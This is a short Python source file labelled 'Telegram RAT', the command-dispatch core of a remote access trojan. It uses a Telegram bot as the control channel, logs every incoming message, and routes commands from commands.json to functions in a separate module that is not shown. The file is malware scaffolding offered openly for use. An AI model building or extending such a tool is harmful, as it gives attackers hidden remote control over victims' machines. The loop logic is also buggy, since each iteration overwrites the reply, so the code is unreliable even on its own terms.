"""
    Telegram RAT
    _____________
    Author : Kelvin
"""
import os
import json
import logging

from telebot import TeleBot
from dotenv import load_dotenv

# all known functions module
import functions 

# load env here
load_dotenv()

# logging
logging.basicConfig(
    filename="app.log",
    filemode="w",
    format="%(asctime)s - %(message)s",
    level=logging.INFO
)

# authenticate to telegram
bot = TeleBot(os.environ.get("TELEGRAM_TOKEN"))

def load_commands(filename="commands.json"):
    """ load all known command """
    with open(filename) as file_:
        commands = json.load(file_)
    return commands
# end def

@bot.message_handler(func=lambda message: True)
def receive_all(message):
    """ handle all incoming message and route it to right function """
    logging.info(message)

    commands = load_commands()
    for command in commands:
        if message.text not in command["message"]:
            response = "Sorry, command not found"
        else:
            method_to_call = getattr(functions, command["function"])
            response = method_to_call(message)
        # end if
    # end for
    bot.reply_to(message, response)
# end def

# start polling bot here
bot.polling()
